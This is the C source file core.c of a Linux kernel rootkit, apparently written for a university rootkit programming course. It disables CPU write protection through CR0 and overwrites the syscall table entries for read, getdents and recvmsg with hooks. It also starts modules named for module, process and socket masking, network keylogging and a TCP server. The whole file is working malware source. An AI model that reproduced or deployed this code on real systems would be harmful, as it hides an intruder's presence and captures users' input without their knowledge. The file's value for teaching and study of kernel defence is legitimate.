
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: core.c                                                          */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/list.h>			/* Needed for linked list interface */
#include <linux/syscalls.h>		/* Needed for __NR_read, __NR_getdents & __NR_recvmsg */
#include <linux/slab.h>			/* Needed for kzalloc & kfree */

#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
#include "module_masking.h"		/* Needed for ... */
#include "network_keylogging.h"	/* Needed for ... */
#include "process_masking.h"	/* Needed for ... */
#include "socket_masking.h"		/* Needed for ... */
#include "conf_manager.h"		/* Needed for ... */
#include "tcp_server.h"			/* Needed for ... */


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A rootkit :)");
MODULE_VERSION("0.1");
MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>");
MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define DEBUG_MODE_IS_ON 1
#define PRINT(str) printk(KERN_INFO "rootkit core: %s\n", (str))
#define DEBUG_PRINT(str) if (DEBUG_MODE_IS_ON) PRINT(str)
#define CR0_WRITE_PROTECT_MASK (1 << 16)


/* Definition of data structs */
struct callback {
	struct list_head list;
	void *cb;
};

typedef asmlinkage long (*my_read_syscall)(unsigned int, char __user *, size_t, long);
typedef asmlinkage int (*my_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int, int);
typedef asmlinkage ssize_t (*my_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned, ssize_t);


/* Definition of global variables */
static void **syscall_table;
asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
asmlinkage int (*original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);
asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);


/* Declaration of functions */
static void disable_write_protect_mode(void);
static void enable_write_protect_mode(void);

asmlinkage long generic_read_syscall(unsigned int, char __user *, size_t);
asmlinkage int generic_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
asmlinkage ssize_t generic_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Callback list heads */
LIST_HEAD(read_callbacks);
LIST_HEAD(getdents_callbacks);
LIST_HEAD(recvmsg_callbacks);


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces ... */
static int __init core_start(void)
{
	disable_write_protect_mode();

	/* Store original syscall addresses */
	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	original_read_syscall = (void *) syscall_table[__NR_read];
	original_getdents_syscall = (void *) syscall_table[__NR_getdents];
	original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];

	/* Overwrite manipulated syscall */
	syscall_table[__NR_read] = generic_read_syscall;
	syscall_table[__NR_getdents] = generic_getdents_syscall;
	syscall_table[__NR_recvmsg] = generic_recvmsg_syscall;

	enable_write_protect_mode();

	//TODO: check return values
	module_masking_init(DEBUG_MODE_IS_ON);
	network_keylogging_init(DEBUG_MODE_IS_ON);
	process_masking_init(DEBUG_MODE_IS_ON);
	socket_masking_init(DEBUG_MODE_IS_ON);
	conf_manager_init(DEBUG_MODE_IS_ON);
	tcp_server_init(DEBUG_MODE_IS_ON);

	DEBUG_PRINT("successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit core_end(void)
{
	disable_write_protect_mode();

	/* Restore original read syscall */
	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;
	syscall_table[__NR_getdents] = (unsigned long *) original_getdents_syscall;
	syscall_table[__NR_recvmsg] = (unsigned long *) original_recvmsg_syscall;

	enable_write_protect_mode();

	tcp_server_exit();
	conf_manager_exit();
	socket_masking_exit();
	process_masking_exit();
	network_keylogging_exit();
	module_masking_exit();

	DEBUG_PRINT("successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


void register_callback(unsigned int callback_nr, void *callback)
{
	struct list_head *to_insert = NULL;
	struct callback *cb = kzalloc(sizeof(struct callback), GFP_KERNEL);

	switch (callback_nr) {
		case __NR_read:
			to_insert = &read_callbacks;
			break;

		case __NR_getdents:
			to_insert = &getdents_callbacks;
			break;

		case __NR_recvmsg:
			to_insert = &recvmsg_callbacks;
			break;

		default:
			return;
	}

	cb->cb = callback;
	list_add(&(cb->list), to_insert);
}


void deregister_callback(unsigned int callback_nr, void *callback)
{
	struct list_head *to_delete;
	struct callback *cb = NULL;

	switch (callback_nr) {
		case __NR_read:
			to_delete = &read_callbacks;
			break;

		case __NR_getdents:
			to_delete = &getdents_callbacks;
			break;

		case __NR_recvmsg:
			to_delete = &recvmsg_callbacks;
			break;

		default:
			return;
	}

	list_for_each_entry(cb, to_delete, list)
		if (cb->cb == callback) {
			list_del(&(cb->list));
			kfree(cb);
			return;
		}
}


asmlinkage long generic_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	struct callback *cb;

	/* Call original syscall */
	ret = original_read_syscall(fd, buf, count);

	list_for_each_entry(cb, &read_callbacks, list)
		ret = ((my_read_syscall)cb->cb)(fd, buf, count, ret);

	return ret;
}


asmlinkage int generic_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int ret;
	struct callback *cb;

	/* Call original syscall */
	ret = original_getdents_syscall(fd, dirp, count);

	list_for_each_entry(cb, &getdents_callbacks, list)
		ret = ((my_getdents_syscall)cb->cb)(fd, dirp, count, ret);

	return ret;
}


asmlinkage ssize_t generic_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags)
{
	ssize_t ret;
	struct callback *cb;

	/* Call original syscall */
	ret = original_recvmsg_syscall(sockfd, msg, flags);

	list_for_each_entry(cb, &recvmsg_callbacks, list)
		ret = ((my_recvmsg_syscall)cb->cb)(sockfd, msg, flags, ret);

	return ret;
}


module_init(core_start);
module_exit(core_end);
